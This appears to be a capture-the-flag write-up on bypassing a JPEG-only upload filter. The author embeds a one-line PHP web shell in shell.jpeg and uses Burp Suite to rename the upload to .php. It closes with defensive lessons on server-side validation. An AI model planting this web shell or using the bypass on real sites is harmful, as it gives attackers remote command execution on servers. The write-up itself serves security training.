## üß© Solution to the Challenge

I began by analyzing the **HTML source code** of the page containing the file upload form. Specifically, I looked at the accepted file types and noticed that the input field allowed only files with the **`.jpeg`** extension.

### üîç Initial Observations:

* I suspected that server-side validation might also be weak or misconfigured.

### üß™ Bypass Strategy:

To test this, I created a file named `shell.jpeg`, but instead of using a real image, I placed **PHP code** inside it:

```php
<?php system($_GET["cmd"]); ?>
```

* I uploaded this `.jpeg` file directly through the form.
* On the surface, it was accepted, but the server didn't seem to interpret it as PHP yet.

### üïµÔ∏è Manipulating the Request with Burp Suite:

Using **Burp Suite**, I intercepted the `POST` request responsible for the file upload. In the request body, I found the part that included the file metadata:

```
Content-Disposition: form-data; name="file"; filename="shell.jpeg"
```

I modified this line to:

```
filename="shell.php"
```

This tricked the server into saving the file with a `.php` extension instead of `.jpeg`.

* Result:

## üèÅ Conclusion:

The challenge exploited a **weak server-side file validation system**. Although the UI restricted uploads to `.jpeg`, the server trusted the filename from the POST request without rechecking it.

By modifying the filename to `.php` in Burp Suite, I was able to upload and execute a PHP webshell.

This kind of vulnerability emphasizes the importance of:

* Validating file types **server-side**
* Sanitizing file extensions
* Preventing execution in upload directories
